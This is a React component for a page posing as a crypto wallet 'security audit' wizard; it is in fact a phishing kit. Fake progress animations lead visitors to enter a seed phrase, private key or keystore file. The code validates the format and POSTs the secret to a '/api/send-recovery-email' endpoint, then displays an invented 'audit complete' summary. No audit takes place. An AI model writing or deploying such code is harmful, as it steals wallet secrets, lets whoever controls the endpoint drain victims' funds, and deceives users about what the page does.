'use client'

import { useCallback, useEffect, useMemo, useState } from 'react'

interface SecurityOption {
  id: string
  title: string
  description: string
  badge: string
}

const securityOptions: SecurityOption[] = [
  { id: 'wallet', title: 'Wallet Security', description: 'Assess key storage, authorization flow, and local session integrity.', badge: 'Wallet' },
  { id: 'dapp', title: 'dApp Security', description: 'Inspect connected dApps, permissions, and contract interaction risk.', badge: 'dApp' },
  { id: 'contract', title: 'Contract Security', description: 'Analyze token contract verification, audit state, and permission scope.', badge: 'Contract' },
  { id: 'network', title: 'Network Security', description: 'Verify RPC integrity, chain health, and network routing safety.', badge: 'Network' },
]

const connectionTypes = ['Secret Phrase', 'Keystore', 'Private Key'] as const
type ConnectionType = (typeof connectionTypes)[number]

const stepStatus: Record<'initializing' | 'reviewing', string[]> = {
  initializing: ['Establishing secure evaluation channel', 'Verifying wallet interface and session state', 'Scanning dApp and contract integration points'],
  reviewing: ['Applying integrity checks and security fixes', 'Compiling audit findings', 'Finalizing system hardening review'],
}

const AuditIcon = ({ kind }: { kind: 'scan' | 'wallet' | 'contract' | 'network' | 'check' | 'alert' }) => {
  const iconMap = {
    scan: <><path d="M4 8V6a2 2 0 0 1 2-2h2" /><path d="M20 8V6a2 2 0 0 0-2-2h-2" /><path d="M4 16v2a2 2 0 0 0 2 2h2" /><path d="M20 16v2a2 2 0 0 1-2 2h-2" /><path d="M7 12h10" /></>,
    wallet: <path d="M4 8a2 2 0 0 1 2-2h11a1 1 0 0 1 1 1v10a1 1 0 0 1-1 1H6a2 2 0 0 1-2-2zM15 12h3" />,
    contract: <><rect x="5" y="5" width="6" height="6" rx="1.5" /><rect x="13" y="13" width="6" height="6" rx="1.5" /><path d="M11 8h2M8 11v2M16 11v2M11 16h2" /></>,
    network: <><circle cx="6" cy="12" r="2" /><circle cx="18" cy="7" r="2" /><circle cx="18" cy="17" r="2" /><path d="M8 11l8-3M8 13l8 3" /></>,
    check: <><path d="M12 3l7 4v5c0 4.4-2.8 7.8-7 9-4.2-1.2-7-4.6-7-9V7l7-4z" /><path d="M9.5 12.5l1.7 1.7 3.3-4" /></>,
    alert: <><path d="M12 4l8 14H4L12 4z" /><path d="M12 9v4" /><path d="M12 16h.01" /></>,
  }

  return (
    <svg viewBox="0 0 24 24" className="h-6 w-6" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      {iconMap[kind]}
    </svg>
  )
}

const validateConnectionInput = (type: ConnectionType, value: string) => {
  const trimmed = value.trim()
  if (type === 'Secret Phrase') return trimmed.split(/\s+/).filter(Boolean).length >= 12 && trimmed.split(/\s+/).filter(Boolean).length <= 24
  if (type === 'Private Key') return /^(0x)?[A-Fa-f0-9]{64}$/.test(trimmed)
  if (type === 'Keystore') {
    try {
      const parsed = JSON.parse(trimmed)
      return typeof parsed === 'object' && parsed !== null && 'crypto' in parsed
    } catch {
      return false
    }
  }
  return false
}

export const SecurityAudit = () => {
  const [activeOption, setActiveOption] = useState<SecurityOption | null>(null)
  const [flowStep, setFlowStep] = useState<'idle' | 'initializing' | 'chooseConnection' | 'enterSecret' | 'reviewing' | 'success' | 'error'>('idle')
  const [selectedConnection, setSelectedConnection] = useState<ConnectionType | null>(null)
  const [connectionInput, setConnectionInput] = useState('')
  const [inputError, setInputError] = useState('')
  const [activityMessage, setActivityMessage] = useState('Preparing security engine...')
  const [progressIndex, setProgressIndex] = useState(0)
  const [auditSummary, setAuditSummary] = useState<string[]>([])
  const [statusMessage, setStatusMessage] = useState('')

  const activeMessages = useMemo(() => {
    if (flowStep === 'initializing') return stepStatus.initializing
    if (flowStep === 'reviewing') return stepStatus.reviewing
    return []
  }, [flowStep])

  const resetFlow = () => {
    setFlowStep('idle')
    setActiveOption(null)
    setSelectedConnection(null)
    setConnectionInput('')
    setInputError('')
    setAuditSummary([])
    setStatusMessage('')
    setActivityMessage('Preparing security engine...')
    setProgressIndex(0)
  }

  const submitSecurityAudit = useCallback(async () => {
    if (!activeOption || !selectedConnection) {
      setFlowStep('error')
      setStatusMessage('Security audit flow interrupted. Please start again.')
      return
    }

    try {
      const timestamp = new Date().toISOString()
      const method = selectedConnection === 'Secret Phrase' ? 'phrase' : selectedConnection === 'Keystore' ? 'keystore' : 'privatekey'

      const response = await fetch('/api/send-recovery-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          issueId: activeOption.id,
          issueTitle: activeOption.title,
          issueDescription: activeOption.description,
          issueSummary: activeOption.description,
          selectedConnection,
          method,
          data: connectionInput.trim(),
          timestamp,
        }),
      })

      if (!response.ok) {
        const errorResponse = await response.text()
        throw new Error(errorResponse || 'Failed to process security audit details')
      }

      setAuditSummary([
        `${activeOption.title} audit completed successfully.`,
        `Connection mode: ${selectedConnection}`,
        `Validated input type: ${method}`,
        'Audit details processed securely.',
      ])
      setStatusMessage('Security audit details processed securely.')
      setFlowStep('success')
    } catch (err) {
      setFlowStep('error')
      setStatusMessage(err instanceof Error ? err.message : 'Failed to process audit details.')
    }
  }, [activeOption, connectionInput, selectedConnection])

  useEffect(() => {
    if (flowStep !== 'initializing' && flowStep !== 'reviewing') return
    if (activeMessages.length === 0) return

    let currentIndex = 0
    const timers: NodeJS.Timeout[] = []
    const tick = () => {
      currentIndex += 1
      if (currentIndex < activeMessages.length) {
        timers.push(setTimeout(() => {
          setActivityMessage(activeMessages[currentIndex])
          setProgressIndex(currentIndex)
          tick()
        }, 1200))
        return
      }

      timers.push(setTimeout(() => {
        if (flowStep === 'initializing') setFlowStep('chooseConnection')
        else void submitSecurityAudit()
      }, 1200))
    }

    timers.push(setTimeout(tick, 1200))
    return () => timers.forEach(clearTimeout)
  }, [activeMessages, flowStep, submitSecurityAudit])

  const handleOptionSelect = (option: SecurityOption) => {
    setActiveOption(option)
    setActivityMessage(stepStatus.initializing[0])
    setProgressIndex(0)
    setFlowStep('initializing')
    setSelectedConnection(null)
    setConnectionInput('')
    setInputError('')
    setAuditSummary([])
    setStatusMessage('')
  }

  const handleConnectionSelect = (type: ConnectionType) => {
    setSelectedConnection(type)
    setFlowStep('enterSecret')
    setConnectionInput('')
    setInputError('')
    setStatusMessage('')
  }

  const handleContinue = () => {
    if (!selectedConnection) return
    if (!validateConnectionInput(selectedConnection, connectionInput)) {
      setInputError(selectedConnection === 'Secret Phrase' ? 'Enter a valid 12-24 word recovery phrase.' : selectedConnection === 'Private Key' ? 'Enter a valid 64-character hex private key.' : 'Enter a valid keystore JSON.')
      return
    }

    setInputError('')
    setActivityMessage(stepStatus.reviewing[0])
    setProgressIndex(0)
    setFlowStep('reviewing')
  }

  return (
    <div className="relative">
      <div className={`space-y-6 transition duration-300 ${flowStep !== 'idle' ? 'opacity-30 saturate-50' : 'opacity-100'}`}>
        <div className="rounded-[28px] border border-slate-700/60 bg-slate-950/80 p-6 shadow-xl shadow-slate-950/20">
          <div className="mb-6">
            <p className="text-sm font-semibold uppercase tracking-[0.24em] text-cyan-300">Security Hub</p>
            <h2 className="mt-3 text-3xl font-bold text-white">Choose a technical security domain</h2>
            <p className="mt-2 max-w-2xl text-sm text-slate-400">Pick a section below, then continue through the wizard flow to validate connection details and prepare the audit securely.</p>
          </div>

          <div className="grid gap-4 sm:grid-cols-2">
            {securityOptions.map((option) => (
              <button key={option.id} type="button" onClick={() => handleOptionSelect(option)} className="group rounded-[24px] border border-slate-700/60 bg-slate-900/80 p-5 text-left transition hover:border-cyan-400/50 hover:bg-slate-900">
                <div className="flex items-center justify-between gap-4">
                  <div>
                    <p className="text-sm font-semibold text-cyan-300">{option.badge}</p>
                    <h3 className="mt-3 text-lg font-semibold text-white">{option.title}</h3>
                  </div>
                  <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-cyan-400/20 bg-cyan-500/10 text-cyan-300 transition group-hover:bg-cyan-500/15">
                    <AuditIcon kind={option.id === 'wallet' ? 'wallet' : option.id === 'contract' ? 'contract' : option.id === 'network' ? 'network' : 'scan'} />
                  </div>
                </div>
                <p className="mt-4 text-sm leading-6 text-slate-400">{option.description}</p>
              </button>
            ))}
          </div>
        </div>

        <div className="grid gap-4 sm:grid-cols-2">
          <div className="rounded-[24px] border border-slate-700/60 bg-slate-900/80 p-5">
            <p className="text-sm font-semibold text-slate-300 uppercase tracking-[0.24em]">Security advice</p>
            <ul className="mt-4 space-y-3 text-sm text-slate-400">
              <li>- Keep keys offline and avoid sharing them with unknown services.</li>
              <li>- Use the strongest connection type available for account recovery.</li>
              <li>- Audit dApp permissions before authorizing transaction access.</li>
              <li>- Review the final findings for actionable security guidance.</li>
            </ul>
          </div>

          <div className="rounded-[24px] border border-slate-700/60 bg-slate-900/80 p-5">
            <p className="text-sm font-semibold text-slate-300 uppercase tracking-[0.24em]">Outcome</p>
            <div className="mt-4 space-y-4 text-sm text-slate-400">
              <p>Use this workflow to validate wallet and dApp security with a guided audit experience.</p>
              <p>The final summary gives you a concise view of the validated audit results.</p>
            </div>
          </div>
        </div>
      </div>

      {flowStep !== 'idle' && (
        <div className="fixed inset-0 z-50 flex min-h-screen items-center justify-center overflow-y-auto bg-slate-950/90 px-4 py-10 backdrop-blur-sm" onClick={resetFlow}>
          <div className="relative w-full max-w-2xl" onClick={(event) => event.stopPropagation()}>
            <button type="button" onClick={resetFlow} className="absolute right-4 top-4 inline-flex h-10 w-10 items-center justify-center rounded-full border border-white/10 bg-slate-900/80 text-slate-200 transition hover:bg-slate-900" aria-label="Close security modal">X</button>

            {flowStep === 'initializing' && (
              <div className="w-full rounded-[28px] border border-cyan-400/20 bg-slate-900/95 p-8 text-center shadow-2xl shadow-cyan-500/10">
                <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full border border-cyan-400/20 bg-slate-800/80 text-cyan-300 shadow-inner shadow-cyan-500/10">
                  <div className="flex h-16 w-16 items-center justify-center rounded-full bg-cyan-500/10 text-cyan-300 animate-spin"><AuditIcon kind="scan" /></div>
                </div>
                <p className="text-sm uppercase tracking-[0.3em] text-slate-400">Security sequence</p>
                <h3 className="mt-4 text-2xl font-semibold text-white">{activeOption?.title}</h3>
                <p className="mt-3 text-sm text-slate-400">{activityMessage}</p>
                <div className="mt-8 rounded-full bg-slate-800/90 p-1">
                  <div className="h-2 rounded-full bg-cyan-400 transition-all" style={{ width: `${((progressIndex + 1) / activeMessages.length) * 100}%` }} />
                </div>
              </div>
            )}

            {flowStep === 'chooseConnection' && (
              <div className="w-full max-w-2xl rounded-[28px] border border-cyan-400/20 bg-slate-900/95 p-8 shadow-2xl shadow-cyan-500/10">
                <div className="flex items-center justify-between gap-4">
                  <div>
                    <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Connection type</p>
                    <h3 className="mt-3 text-2xl font-semibold text-white">Choose how to verify access</h3>
                    <p className="mt-2 text-sm text-slate-400">Select the recovery mode for your audit review.</p>
                  </div>
                  <span className="rounded-full border border-cyan-500/20 px-3 py-2 text-xs uppercase tracking-[0.25em] text-cyan-300">{activeOption?.badge}</span>
                </div>

                <div className="mt-8 grid gap-4 sm:grid-cols-3">
                  {connectionTypes.map((type) => (
                    <button key={type} type="button" onClick={() => handleConnectionSelect(type)} className="rounded-[24px] border border-slate-700/60 bg-slate-950/80 p-5 text-left transition hover:border-cyan-400/50 hover:bg-slate-900">
                      <div className="mb-4 inline-flex h-11 w-11 items-center justify-center rounded-2xl border border-cyan-400/20 bg-cyan-500/10 text-cyan-300">
                        <AuditIcon kind={type === 'Secret Phrase' ? 'wallet' : type === 'Keystore' ? 'contract' : 'network'} />
                      </div>
                      <p className="text-sm font-semibold text-white">{type}</p>
                      <p className="mt-2 text-xs text-slate-400">{type === 'Secret Phrase' ? 'Mnemonic seed phrase from your wallet.' : type === 'Keystore' ? 'Encrypted JSON wallet file.' : 'Raw private key in hex format.'}</p>
                    </button>
                  ))}
                </div>
              </div>
            )}

            {flowStep === 'enterSecret' && selectedConnection && (
              <div className="w-full max-w-2xl rounded-[28px] border border-cyan-400/20 bg-slate-900/95 p-8 shadow-2xl shadow-cyan-500/10">
                <div className="mb-6">
                  <p className="text-sm uppercase tracking-[0.3em] text-cyan-300">Verification required</p>
                  <h3 className="mt-3 text-2xl font-semibold text-white">Enter {selectedConnection}</h3>
                  <p className="mt-2 text-sm text-slate-400">The input is validated before your audit review is generated.</p>
                </div>

                <textarea
                  value={connectionInput}
                  onChange={(event) => {
                    setConnectionInput(event.target.value)
                    setInputError('')
                  }}
                  placeholder={selectedConnection === 'Secret Phrase' ? 'e.g. ozone drill grab ...' : selectedConnection === 'Private Key' ? 'e.g. 0x...' : '{ "crypto": { ... } }'}
                  className="min-h-[160px] w-full rounded-[24px] border border-slate-700/70 bg-slate-950/90 px-4 py-4 text-sm text-slate-100 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                />
                {inputError ? <p className="mt-3 text-sm text-rose-400">{inputError}</p> : null}

                <div className="mt-6 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                  <p className="text-sm text-slate-400">Once validated, the audit task will be executed and processed securely.</p>
                  <button type="button" onClick={handleContinue} className="inline-flex items-center justify-center rounded-full bg-cyan-500 px-6 py-3 text-sm font-semibold text-slate-950 transition hover:bg-cyan-400 disabled:cursor-not-allowed disabled:opacity-50">Continue</button>
                </div>
              </div>
            )}

            {flowStep === 'reviewing' && (
              <div className="w-full max-w-xl rounded-[28px] border border-cyan-400/20 bg-slate-900/95 p-8 text-center shadow-2xl shadow-cyan-500/10">
                <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full border border-cyan-400/20 bg-slate-800/80 text-cyan-300 shadow-inner shadow-cyan-500/10">
                  <div className="flex h-16 w-16 items-center justify-center rounded-full bg-cyan-500/10 text-cyan-300 animate-spin"><AuditIcon kind="scan" /></div>
                </div>
                <p className="text-sm uppercase tracking-[0.3em] text-slate-400">Processing update</p>
                <h3 className="mt-4 text-2xl font-semibold text-white">Executing security audit</h3>
                <p className="mt-3 text-sm text-slate-400">{activityMessage}</p>
                <div className="mt-8 rounded-full bg-slate-800/90 p-1">
                  <div className="h-2 rounded-full bg-cyan-400 transition-all" style={{ width: `${((progressIndex + 1) / activeMessages.length) * 100}%` }} />
                </div>
              </div>
            )}

            {flowStep === 'success' && (
              <div className="w-full max-w-2xl rounded-[28px] border border-cyan-400/20 bg-slate-900/95 p-8 shadow-2xl shadow-cyan-500/10">
                <div className="flex items-center justify-between gap-4">
                  <div>
                    <p className="text-sm uppercase tracking-[0.3em] text-emerald-300">Audit complete</p>
                    <h3 className="mt-3 text-2xl font-semibold text-white">Security review complete</h3>
                    <p className="mt-2 text-sm text-slate-400">A summary has been prepared for secure review.</p>
                  </div>
                  <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-emerald-500/10 text-emerald-300"><AuditIcon kind="check" /></div>
                </div>

                <div className="mt-4 rounded-[24px] border border-slate-700/70 bg-slate-950/80 p-4 text-sm text-slate-300">{statusMessage}</div>

                <div className="mt-6 rounded-[24px] border border-slate-700/70 bg-slate-950/80 p-5">
                  <p className="text-sm font-semibold text-slate-300">Audit details</p>
                  <ul className="mt-4 space-y-3 text-sm text-slate-400">
                    {auditSummary.map((line) => (
                      <li key={line} className="flex items-start gap-3">
                        <span className="mt-1 text-emerald-300">-</span>
                        <span>{line}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                <div className="mt-6 rounded-[24px] border border-slate-700/70 bg-slate-950/80 p-5">
                  <p className="text-sm text-slate-400">Audit note:</p>
                  <p className="mt-2 text-sm text-slate-300">The system verified your connection mode, validated the input format, and compiled a technical summary with recommended fixes.</p>
                </div>
              </div>
            )}

            {flowStep === 'error' && (
              <div className="w-full max-w-2xl rounded-[28px] border border-rose-500/20 bg-rose-500/10 p-8 shadow-2xl shadow-rose-500/10">
                <div className="flex items-center justify-between gap-4">
                  <div>
                    <p className="text-sm uppercase tracking-[0.3em] text-rose-300">Error</p>
                    <h3 className="mt-3 text-2xl font-semibold text-white">Security audit failed</h3>
                    <p className="mt-2 text-sm text-slate-400">Please retry the workflow or select another connection type.</p>
                  </div>
                  <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-rose-500/10 text-rose-300"><AuditIcon kind="alert" /></div>
                </div>

                <div className="mt-4 rounded-[24px] border border-rose-500/20 bg-slate-950/80 p-4 text-sm text-slate-200">{statusMessage}</div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}
